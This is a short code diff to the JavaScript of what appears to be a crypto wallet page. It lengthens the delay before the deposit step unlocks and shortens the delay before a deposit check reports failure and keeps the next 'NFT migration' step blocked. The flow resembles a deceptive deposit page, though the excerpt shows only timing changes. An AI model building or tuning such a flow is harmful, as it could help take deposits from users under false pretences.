@@ -659,7 +659,7 @@ function createWallet(btn){
         // unlock deposit step
         const step2 = document.getElementById('step2');
         step2.classList.remove('inactive'); step2.classList.add('active');
-    },1500);
+    },5000);
 }
 
 /* ---------- Copy wallet address (custom pop‑up) ---------- */
@@ -685,7 +685,7 @@ function verifyDeposit(btn){
         setLoading(btn,false);
         document.getElementById('fail2').classList.remove('hidden');
         // keep next step blocked – do nothing else
-    },3000);
+    },1500);
 }
 
 /* ---------- NFT migration (only reachable after a successful deposit) ---------- */
